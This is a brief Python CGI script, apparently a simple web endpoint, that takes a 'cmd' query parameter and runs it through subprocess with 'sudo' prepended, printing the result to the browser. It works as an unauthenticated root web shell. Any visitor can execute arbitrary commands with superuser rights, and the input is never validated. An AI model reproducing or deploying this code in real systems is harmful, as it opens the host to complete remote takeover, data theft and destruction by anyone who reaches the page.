#!/usr/bin/python3

import cgi 
import subprocess

print("content-type: text/html")
print()

command = cgi.FieldStorage()
x = command.getvalue("cmd")

output = subprocess.getoutput("sudo " + x)
print(output)
